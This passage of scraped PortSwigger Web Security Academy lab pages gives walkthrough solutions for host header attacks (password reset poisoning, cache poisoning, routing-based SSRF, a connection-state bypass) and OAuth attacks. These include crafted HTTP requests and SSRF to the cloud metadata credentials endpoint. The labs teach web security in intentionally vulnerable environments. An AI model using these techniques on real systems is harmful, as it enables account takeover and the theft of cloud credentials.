                <p class="widget-container-labelevel">
                    <span class="label-light-green-small">
                        APPRENTICE
                    </span>
                </p>
            </div>
            <p>
                This lab is vulnerable to password reset poisoning. The user
                <code>
   carlos
  </code>
                will carelessly click on any links in emails that he receives. To solve the lab, log in to Carlos's
                account.
            </p>
            <p>
                You can log in to your own account using the following credentials:
                <code>
   wiener:peter
  </code>
                . Any emails sent to this account can be read via the email client on the exploit server.
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/16d6e2494470f17d6186fd7f07dc9c7e2220de7ca3d8380fdc86806783644273?referrer=%2fweb-security%2fhost-header%2fexploiting%2fpassword-reset-poisoning%2flab-host-header-basic-password-reset-poisoning"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Go to the login page and notice the "Forgot your password?" functionality. Request a
                                    password reset for your own account.
                                </li>
                                <li>
                                    Go to the exploit server and open the email client. Observe that you have received
                                    an email containing a link to reset your password. Notice that the URL contains the
                                    query parameter
                                    <code>
        temp-forgot-password-token
       </code>
                                    .
                                </li>
                                <li>
                                    Click the link and observe that you are prompted to enter a new password. Reset your
                                    password to whatever you want.
                                </li>
                                <li>
                                    In Burp, study the HTTP history. Notice that the
                                    <code>
        POST /forgot-password
       </code>
                                    request is used to trigger the password reset email. This contains the username
                                    whose password is being reset as a body parameter. Send this request to Burp
                                    Repeater.
                                </li>
                                <li>
                                    In Burp Repeater, observe that you can change the Host header to an arbitrary value
                                    and still successfully trigger a password reset. Go back to the email server and
                                    look at the new email that you've received. Notice that the URL in the email
                                    contains your arbitrary Host header instead of the usual domain name.
                                </li>
                                <li>
                                    Back in Burp Repeater, change the Host header to your exploit server's domain name (
                                    <code>
        YOUR-EXPLOIT-SERVER-ID.exploit-server.net
       </code>
                                    ) and change the
                                    <code>
        username
       </code>
                                    parameter to
                                    <code>
        carlos
       </code>
                                    . Send the request.
                                </li>
                                <li>
                                    Go to your exploit server and open the access log. You will see a request for
                                    <code>
        GET /forgot-password
       </code>
                                    with the
                                    <code>
        temp-forgot-password-token
       </code>
                                    parameter containing Carlos's password reset token. Make a note of this token.
                                </li>
                                <li>
                                    Go to your email client and copy the genuine password reset URL from your first
                                    email. Visit this URL in the browser, but replace your reset token with the one you
                                    obtained from the access log.
                                </li>
                                <li>
                                    Change Carlos's password to whatever you want, then log in as
                                    <code>
        carlos
       </code>
                                    to solve the lab.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Host header authentication bypass
                (host-header)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-green-small">
                        APPRENTICE
                    </span>
                </p>
            </div>
            <p>
                This lab makes an assumption about the privilege level of the user based on the HTTP Host header.
            </p>
            <p>
                To solve the lab, access the admin panel and delete the user
                <code>
   carlos
  </code>
                .
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/5a48933f3a964cb3a951fad54ed62078c63e81e3fcd2df74d5712dc626d14b50?referrer=%2fweb-security%2fhost-header%2fexploiting%2flab-host-header-authentication-bypass"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Send the
                                    <code>
        GET /
       </code>
                                    request that received a 200 response to Burp Repeater. Notice that you can change
                                    the Host header to an arbitrary value and still successfully access the home page.
                                </li>
                                <li>
                                    Browse to
                                    <code>
        /robots.txt
       </code>
                                    and observe that there is an admin panel at
                                    <code>
        /admin
       </code>
                                    .
                                </li>
                                <li>
                                    Try and browse to
                                    <code>
        /admin
       </code>
                                    . You do not have access, but notice the error message, which reveals that the panel
                                    can be accessed by local users.
                                </li>
                                <li>
                                    Send the
                                    <code>
        GET /admin
       </code>
                                    request to Burp Repeater.
                                </li>
                                <li>
                                    In Burp Repeater, change the Host header to
                                    <code>
        localhost
       </code>
                                    and send the request. Observe that you have now successfully accessed the admin
                                    panel, which provides the option to delete different users.
                                </li>
                                <li>
                                    Change the request line to
                                    <code>
        GET /admin/delete?username=carlos
       </code>
                                    and send the request to delete
                                    <code>
        carlos
       </code>
                                    to solve the lab.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Web cache poisoning via ambiguous requests
                (host-header)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab is vulnerable to
                <a href="https://portswigger.net/web-security/web-cache-poisoning">
                    web cache poisoning
                </a>
                due to discrepancies in how the cache and the back-end application handle ambiguous requests. An
                unsuspecting user regularly visits the site's home page.
            </p>
            <p>
                To solve the lab, poison the cache so the home page executes
                <code>
   alert(document.cookie)
  </code>
                in the victim's browser.
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/2d282e25fbe71276663267bbae9175c2dbf0fd2f4916ca195823cf7c8a7d2cbf?referrer=%2fweb-security%2fhost-header%2fexploiting%2flab-host-header-web-cache-poisoning-via-ambiguous-requests"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Send the
                                    <code>
        GET /
       </code>
                                    request that received a 200 response to Burp Repeater and study the lab's behavior.
                                    Observe that the website validates the Host header. After tampering with it, you are
                                    unable to still access the home page.
                                </li>
                                <li>
                                    In the original response, notice the verbose caching headers, which tell you when
                                    you get a cache hit and how old the cached response is. Add an arbitrary query
                                    parameter to your requests to serve as a cache buster, for example,
                                    <code>
        GET /?cb=123
       </code>
                                    . You can simply change this parameter each time you want a fresh response from the
                                    back-end server.
                                </li>
                                <li>
                                    Notice that if you add a second Host header with an arbitrary value, this appears to
                                    be ignored when validating and routing your request. Crucially, notice that the
                                    arbitrary value of your second Host header is reflected in an absolute URL used to
                                    import a script from
                                    <code>
        /resources/js/tracking.js
       </code>
                                    .
                                </li>
                                <li>
                                    Remove the second Host header and send the request again using the same cache
                                    buster. Notice that you still receive the same cached response containing your
                                    injected value.
                                </li>
                                <li>
                                    Go to the exploit server and create a file at
                                    <code>
        /resources/js/tracking.js
       </code>
                                    containing the payload
                                    <code>
        alert(document.cookie)
       </code>
                                    . Store the exploit and copy the domain name for your exploit server.
                                </li>
                                <li>
                                    <p>
                                        Back in Burp Repeater, add a second Host header containing your exploit server
                                        domain name. The request should look something like this:
                                    </p>
                                    <code class="code-scrollable">
        GET /?cb=123 HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
       </code>
                                </li>
                                <li>
                                    Send the request a couple of times until you get a cache hit with your exploit
                                    server URL reflected in the response. To simulate the victim, request the page in
                                    the browser using the same cache buster in the URL. Make sure that the
                                    <code>
        alert()
       </code>
                                    fires.
                                </li>
                                <li>
                                    In Burp Repeater, remove any cache busters and keep replaying the request until you
                                    have re-poisoned the cache. The lab is solved when the victim visits the home page.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Routing-based SSRF
                (host-header)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab is vulnerable to routing-based
                <a href="https://portswigger.net/web-security/ssrf">
                    SSRF
                </a>
                via the Host header. You can exploit this to access an insecure intranet admin panel located on an
                internal IP address.
            </p>
            <p>
                To solve the lab, access the internal admin panel located in the
                <code>
   192.168.0.0/24
  </code>
                range, then delete the user
                <code>
   carlos
  </code>
                .
            </p>
            <div class="highlightedarea">
                <h4>
                    Note
                </h4>
                <p>
                    To prevent the Academy platform being used to attack third parties, our firewall blocks interactions
                    between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's
                    default public server.
                </p>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/2744f28d772f25b5878c7fba870871916535bc5ae1458431fb62c5517346c62e?referrer=%2fweb-security%2fhost-header%2fexploiting%2flab-host-header-routing-based-ssrf"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Send the
                                    <code>
        GET /
       </code>
                                    request that received a 200 response to Burp Repeater.
                                </li>
                                <li>
                                    In Burp Repeater, select the Host header value, right-click and select
                                    <strong>
                                        Insert Collaborator payload
                                    </strong>
                                    to replace it with a Collaborator domain name. Send the request.
                                </li>
                                <li>
                                    Go to the Collaborator tab and click
                                    <strong>
                                        Poll now
                                    </strong>
                                    . You should see a couple of network interactions in the table, including an HTTP
                                    request. This confirms that you are able to make the website's middleware issue
                                    requests to an arbitrary server.
                                </li>
                                <li>
                                    Send the
                                    <code>
        GET /
       </code>
                                    request to Burp Intruder.
                                </li>
                                <li>
                                    Go to Burp Intruder and select the
                                    <strong>
                                        Positions
                                    </strong>
                                    tab.
                                </li>
                                <li>
                                    Deselect
                                    <strong>
                                        Update Host header to match target
                                    </strong>
                                    .
                                </li>
                                <li>
                                    <p>
                                        Delete the value of the Host header and replace it with the following IP
                                        address, adding a payload position to the final octet:
                                    </p>
                                    <code class="code-scrollable">
        Host: 192.168.0.Â§0Â§
       </code>
                                </li>
                                <li>
                                    <p>
                                        On the
                                        <strong>
                                            Payloads
                                        </strong>
                                        tab, select the payload type
                                        <strong>
                                            Numbers
                                        </strong>
                                        . Under
                                        <strong>
                                            Payload settings
                                        </strong>
                                        , enter the following values:
                                    </p>
                                    <code class="code-scrollable">
        From: 0
To: 255
Step: 1
       </code>
                                </li>
                                <li>
                                    Click
                                    <strong>
                                        Start attack
                                    </strong>
                                    . A warning will inform you that the Host header does not match the specified target
                                    host. As we've done this deliberately, you can ignore this message.
                                </li>
                                <li>
                                    When the attack finishes, click the
                                    <strong>
                                        Status
                                    </strong>
                                    column to sort the results. Notice that a single request received a 302 response
                                    redirecting you to
                                    <code>
        /admin
       </code>
                                    . Send this request to Burp Repeater.
                                </li>
                                <li>
                                    In Burp Repeater, change the request line to
                                    <code>
        GET /admin
       </code>
                                    and send the request. In the response, observe that you have successfully accessed
                                    the admin panel.
                                </li>
                                <li>
                                    Study the form for deleting users. Notice that it will generate a
                                    <code>
        POST
       </code>
                                    request to
                                    <code>
        /admin/delete
       </code>
                                    with both a
                                    <a href="https://portswigger.net/web-security/csrf">
                                        CSRF
                                    </a>
                                    token and
                                    <code>
        username
       </code>
                                    parameter. You need to manually craft an equivalent request to delete
                                    <code>
        carlos
       </code>
                                    .
                                </li>
                                <li>
                                    <p>
                                        Change the path in your request to
                                        <code>
         /admin/delete
        </code>
                                        . Copy the CSRF token from the displayed response and add it as a query
                                        parameter to your request. Also add a
                                        <code>
         username
        </code>
                                        parameter containing
                                        <code>
         carlos
        </code>
                                        . The request line should now look like this but with a different CSRF token:
                                    </p>
                                    <code class="code-scrollable">
        GET /admin/delete?csrf=QCT5OmPeAAPnyTKyETt29LszLL7CbPop&amp;username=carlos
       </code>
                                </li>
                                <li>
                                    Copy the session cookie from the
                                    <code>
        Set-Cookie
       </code>
                                    header in the displayed response and add it to your request.
                                </li>
                                <li>
                                    Right-click on your request and select
                                    <strong>
                                        Change request method
                                    </strong>
                                    . Burp will convert it to a
                                    <code>
        POST
       </code>
                                    request.
                                </li>
                                <li>
                                    Send the request to delete
                                    <code>
        carlos
       </code>
                                    and solve the lab.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: SSRF via flawed request parsing
                (host-header)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab is vulnerable to routing-based
                <a href="https://portswigger.net/web-security/ssrf">
                    SSRF
                </a>
                due to its flawed parsing of the request's intended host. You can exploit this to access an insecure
                intranet admin panel located at an internal IP address.
            </p>
            <p>
                To solve the lab, access the internal admin panel located in the
                <code>
   192.168.0.0/24
  </code>
                range, then delete the user
                <code>
   carlos
  </code>
                .
            </p>
            <div class="highlightedarea">
                <h4>
                    Note
                </h4>
                <p>
                    To prevent the Academy platform being used to attack third parties, our firewall blocks interactions
                    between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's
                    default public server.
                </p>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/fda358647ac3a4c7d8145cfc890d3191223eb52ffb099df6764d75a6e1c7d772?referrer=%2fweb-security%2fhost-header%2fexploiting%2flab-host-header-ssrf-via-flawed-request-parsing"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Send the
                                    <code>
        GET /
       </code>
                                    request that received a 200 response to Burp Repeater and study the lab's behavior.
                                    Observe that the website validates the Host header and blocks any requests in which
                                    it has been modified.
                                </li>
                                <li>
                                    <p>
                                        Observe that you can also access the home page by supplying an absolute URL in
                                        the request line as follows:
                                    </p>
                                    <code class="code-scrollable">
        GET https://YOUR-LAB-ID.web-security-academy.net/
       </code>
                                </li>
                                <li>
                                    Notice that when you do this, modifying the Host header no longer causes your
                                    request to be blocked. Instead, you receive a timeout error. This suggests that the
                                    absolute URL is being validated instead of the Host header.
                                </li>
                                <li>
                                    <p>
                                        Use Burp Collaborator to confirm that you can make the website's middleware
                                        issue requests to an arbitrary server in this way. For example, the following
                                        request will trigger an HTTP request to your Collaborator server:
                                    </p>
                                    <code class="code-scrollable">
        GET https://YOUR-LAB-ID.web-security-academy.net/
Host: BURP-COLLABORATOR-SUBDOMAIN
       </code>
                                </li>
                                <li>
                                    Right-click and select
                                    <strong>
                                        Insert Collaborator payload
                                    </strong>
                                    to insert a Burp Collaborator subdomain where indicated in the request.
                                </li>
                                <li>
                                    Send the request containing the absolute URL to Burp Intruder.
                                </li>
                                <li>
                                    Go to Burp Intruder and select the
                                    <strong>
                                        Positions
                                    </strong>
                                    tab.
                                </li>
                                <li>
                                    Deselect
                                    <strong>
                                        Update Host header to match target
                                    </strong>
                                    .
                                </li>
                                <li>
                                    Use the Host header to scan the IP range
                                    <code>
        192.168.0.0/24
       </code>
                                    to identify the IP address of the admin interface. Send this request to Burp
                                    Repeater.
                                </li>
                                <li>
                                    In Burp Repeater, append
                                    <code>
        /admin
       </code>
                                    to the absolute URL in the request line and send the request. Observe that you now
                                    have access to the admin panel, including a form for deleting users.
                                </li>
                                <li>
                                    <p>
                                        Change the absolute URL in your request to point to
                                        <code>
         /admin/delete
        </code>
                                        . Copy the
                                        <a href="https://portswigger.net/web-security/csrf">
                                            CSRF
                                        </a>
                                        token from the displayed response and add it as a query parameter to your
                                        request. Also add a
                                        <code>
         username
        </code>
                                        parameter containing
                                        <code>
         carlos
        </code>
                                        . The request line should now look like this but with a different CSRF token:
                                    </p>
                                    <code class="code-scrollable">
        GET https://YOUR-LAB-ID.web-security-academy.net/admin/delete?csrf=QCT5OmPeAAPnyTKyETt29LszLL7CbPop&amp;username=carlos
       </code>
                                </li>
                                <li>
                                    Copy the session cookie from the
                                    <code>
        Set-Cookie
       </code>
                                    header in the displayed response and add it to your request.
                                </li>
                                <li>
                                    Right-click on your request and select "Change request method". Burp will convert it
                                    to a
                                    <code>
        POST
       </code>
                                    request.
                                </li>
                                <li>
                                    Send the request to delete
                                    <code>
        carlos
       </code>
                                    and solve the lab.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Host validation bypass via connection state attack
                (host-header)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab is vulnerable to routing-based
                <a href="https://portswigger.net/web-security/ssrf">
                    SSRF
                </a>
                via the Host header. Although the front-end server may initially appear to perform robust validation of
                the Host header, it makes assumptions about all requests on a connection based on the first request it
                receives.
            </p>
            <p>
                To solve the lab, exploit this behavior to access an internal admin panel located at
                <code>
   192.168.0.1/admin
  </code>
                , then delete the user
                <code>
   carlos
  </code>
                .
            </p>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-erlenmeyer">
                            </span>
                            Hint
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                Solving this lab requires features first released in
                                <a
                                    href="https://portswigger.net/burp/releases/professional-community-2022-8-1?requestededition=professional">
                                    Burp Suite 2022.8.1
                                </a>
                                .
                            </p>
                        </div>
                    </div>
                </details>
            </div>
            <p>
                This lab is based on real-world vulnerabilities discovered by PortSwigger Research. For more details,
                check out
                <a href="https://portswigger.net/research/browser-powered-desync-attacks#state">
                    Browser-Powered Desync Attacks: A New Frontier in HTTP Request Smuggling
                </a>
                .
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/3c3f012cd1e1e6555dfc01b4bdddb6740a83ec699d85741398157fdb74985d78?referrer=%2fweb-security%2fhost-header%2fexploiting%2flab-host-header-host-validation-bypass-via-connection-state-attack"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    <p>
                                        Send the
                                        <code>
         GET /
        </code>
                                        request to Burp Repeater.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Make the following adjustments:
                                    </p>
                                    <ul>
                                        <li>
                                            <p>
                                                Change the path to
                                                <code>
           /admin
          </code>
                                                .
                                            </p>
                                        </li>
                                        <li>
                                            <p>
                                                Change
                                                <code>
           Host
          </code>
                                                header to
                                                <code>
           192.168.0.1
          </code>
                                                .
                                            </p>
                                        </li>
                                    </ul>
                                </li>
                                <li>
                                    <p>
                                        Send the request. Observe that you are simply redirected to the homepage.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Duplicate the tab, then add both tabs to a new group.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Select the first tab and make the following adjustments:
                                    </p>
                                    <ul>
                                        <li>
                                            <p>
                                                Change the path back to
                                                <code>
           /
          </code>
                                                .
                                            </p>
                                        </li>
                                        <li>
                                            <p>
                                                Change the
                                                <code>
           Host
          </code>
                                                header back to
                                                <code>
           YOUR-LAB-ID.h1-web-security-academy.net
          </code>
                                                .
                                            </p>
                                        </li>
                                    </ul>
                                </li>
                                <li>
                                    <p>
                                        Using the drop-down menu next to the
                                        <strong>
                                            Send
                                        </strong>
                                        button, change the send mode to
                                        <strong>
                                            Send group in sequence (single connection)
                                        </strong>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Change the
                                        <code>
         Connection
        </code>
                                        header to
                                        <code>
         keep-alive
        </code>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Send the sequence and check the responses. Observe that the second request has
                                        successfully accessed the admin panel.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Study the response and observe that the admin panel contains an HTML form for
                                        deleting a given user. Make a note of the following details:
                                    </p>
                                    <ul>
                                        <li>
                                            <p>
                                                The action attribute (
                                                <code>
           /admin/delete
          </code>
                                                )
                                            </p>
                                        </li>
                                        <li>
                                            <p>
                                                The name of the input (
                                                <code>
           username
          </code>
                                                )
                                            </p>
                                        </li>
                                        <li>
                                            <p>
                                                The
                                                <code>
           <a href="https://portswigger.net/web-security/csrf">
            csrf
           </a>
          </code>
                                                token.
                                            </p>
                                        </li>
                                    </ul>
                                </li>
                                <li>
                                    <p>
                                        On the second tab in your group, use these details to replicate the request that
                                        would be issued when submitting the form. The result should look something like
                                        this:
                                    </p>
                                    <code class="code-scrollable">
        POST /admin/delete HTTP/1.1
Host: 192.168.0.1
Cookie: _lab=YOUR-LAB-COOKIE; session=YOUR-SESSION-COOKIE
Content-Type: x-www-form-urlencoded
Content-Length: CORRECT

csrf=YOUR-CSRF-TOKEN&amp;username=carlos
       </code>
                                </li>
                                <li>
                                    <p>
                                        Send the requests in sequence down a single connection to solve the lab.
                                    </p>
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Authentication bypass via OAuth implicit flow
                (oauth)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-green-small">
                        APPRENTICE
                    </span>
                </p>
            </div>
            <p>
                This lab uses an
                <a href="https://portswigger.net/web-security/oauth">
                    OAuth
                </a>
                service to allow users to log in with their social media account. Flawed validation by the client
                application makes it possible for an attacker to log in to other users' accounts without knowing their
                password.
            </p>
            <p>
                To solve the lab, log in to Carlos's account. His email address is
                <code>
   carlos@carlos-montoya.net
  </code>
                .
            </p>
            <p>
                You can log in with your own social media account using the following credentials:
                <code>
   wiener:peter
  </code>
                .
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/f12c0972c9b99d48a344c37883cce2e82b5a29c5fa1dbb51d0860363f805ad70?referrer=%2fweb-security%2foauth%2flab-oauth-authentication-bypass-via-oauth-implicit-flow"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    While proxying traffic through Burp, click "My account" and complete the OAuth login
                                    process. Afterwards, you will be redirected back to the blog website.
                                </li>
                                <li>
                                    In Burp, go to "Proxy" &gt; "HTTP history" and study the requests and responses that
                                    make up the OAuth flow. This starts from the authorization request
                                    <code>
        GET /auth?client_id=[...]
       </code>
                                    .
                                </li>
                                <li>
                                    Notice that the client application (the blog website) receives some basic
                                    information about the user from the OAuth service. It then logs the user in by
                                    sending a
                                    <code>
        POST
       </code>
                                    request containing this information to its own
                                    <code>
        /authenticate
       </code>
                                    endpoint, along with the access token.
                                </li>
                                <li>
                                    Send the
                                    <code>
        POST /authenticate
       </code>
                                    request to Burp Repeater. In Repeater, change the email address to
                                    <code>
        carlos@carlos-montoya.net
       </code>
                                    and send the request. Observe that you do not encounter an error.
                                </li>
                                <li>
                                    Right-click on the
                                    <code>
        POST
       </code>
                                    request and select "Request in browser" &gt; "In original session". Copy this URL
                                    and visit it in the browser. You are logged in as Carlos and the lab is solved.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: SSRF via OpenID dynamic client registration
                (oauth)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab allows client applications to dynamically register themselves with the
                <a href="https://portswigger.net/web-security/oauth">
                    OAuth
                </a>
                service via a dedicated registration endpoint. Some client-specific data is used in an unsafe way by the
                OAuth service, which exposes a potential vector for SSRF.
            </p>
            <p>
                To solve the lab, craft an
                <a href="https://portswigger.net/web-security/ssrf">
                    SSRF attack
                </a>
                to access
                <code>
   http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/
  </code>
                and steal the secret access key for the OAuth provider's cloud environment.
            </p>
            <p>
                You can log in to your own account using the following credentials:
                <code>
   wiener:peter
  </code>
            </p>
            <div class="highlightedarea">
                <h4>
                    Note
                </h4>
                <p>
                    To prevent the Academy platform being used to attack third parties, our firewall blocks interactions
                    between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's
                    default public server.
                </p>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/832aba2ee324f0e0d7fd3881acff87490bf540d183ebbeccffffd71f5310a150?referrer=%2fweb-security%2foauth%2fopenid%2flab-oauth-ssrf-via-openid-dynamic-client-registration"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    While proxying traffic through Burp, log in to your own account. Browse to
                                    <code>
        https://oauth-YOUR-OAUTH-SERVER.oauth-server.net/.well-known/openid-configuration
       </code>
                                    to access the configuration file. Notice that the client registration endpoint is
                                    located at
                                    <code>
        /reg
       </code>
                                    .
                                </li>
                                <li>
                                    <p>
                                        In Burp Repeater, create a suitable
                                        <code>
         POST
        </code>
                                        request to register your own client application with the OAuth service. You must
                                        at least provide a
                                        <code>
         redirect_uris
        </code>
                                        array containing an arbitrary whitelist of callback URIs for your fake
                                        application. For example:
                                    </p>
                                    <code class="code-scrollable">
        POST /reg HTTP/1.1
Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
Content-Type: application/json

{
    "redirect_uris" : [
        "https://example.com"
    ]
}
       </code>
                                </li>
                                <li>
                                    Send the request. Observe that you have now successfully registered your own client
                                    application without requiring any authentication. The response contains various
                                    metadata associated with your new client application, including a new
                                    <code>
        client_id
       </code>
                                    .
                                </li>
                                <li>
                                    Using Burp, audit the OAuth flow and notice that the "Authorize" page, where the
                                    user consents to the requested permissions, displays the client application's logo.
                                    This is fetched from
                                    <code>
        /client/CLIENT-ID/logo
       </code>
                                    . We know from the
                                    <a href="https://portswigger.net/web-security/oauth/openid">
                                        OpenID
                                    </a>
                                    specification that client applications can provide the URL for their logo using the
                                    <code>
        logo_uri
       </code>
                                    property during dynamic registration. Send the
                                    <code>
        GET /client/CLIENT-ID/logo
       </code>
                                    request to Burp Repeater.
                                </li>
                                <li>
                                    <p>
                                        In Repeater, go back to the
                                        <code>
         POST /reg
        </code>
                                        request that you created earlier. Add the
                                        <code>
         logo_uri
        </code>
                                        property. Right-click and select "Insert Collaborator payload" to paste a
                                        Collaborator URL as its value . The final request should look something like
                                        this:
                                    </p>
                                    <code class="code-scrollable">
        POST /reg HTTP/1.1
Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
Content-Type: application/json

{
    "redirect_uris" : [
        "https://example.com"
    ],
    "logo_uri" : "https://BURP-COLLABORATOR-SUBDOMAIN"
}
       </code>
                                </li>
                                <li>
                                    Send the request to register a new client application and copy the
                                    <code>
        client_id
       </code>
                                    from the response.
                                </li>
                                <li>
                                    In Repeater, go to the
                                    <code>
        GET /client/CLIENT-ID/logo
       </code>
                                    request. Replace the
                                    <code>
        CLIENT-ID
       </code>
                                    in the path with the new one you just copied and send the request.
                                </li>
                                <li>
                                    Go to the Collaborator tab dialog and check for any new interactions. Notice that
                                    there is an HTTP interaction attempting to fetch your non-existent logo. This
                                    confirms that you can successfully use the
                                    <code>
        logo_uri
       </code>
                                    property to elicit requests from the OAuth server.
                                </li>
                                <li>
                                    <p>
                                        Go back to the
                                        <code>
         POST /reg
        </code>
                                        request in Repeater and replace the current
                                        <code>
         logo_uri
        </code>
                                        value with the target URL:
                                    </p>
                                    <code class="code-scrollable">
        "logo_uri" : "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
       </code>
                                </li>
                                <li>
                                    Send this request and copy the new
                                    <code>
        client_id
       </code>
                                    from the response.
                                </li>
                                <li>
                                    Go back to the
                                    <code>
        GET /client/CLIENT-ID/logo
       </code>
                                    request and replace the
                                    <code>
